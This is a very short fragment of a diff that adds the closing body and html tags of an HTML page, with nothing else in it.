+    
+
+</body>
+</html>
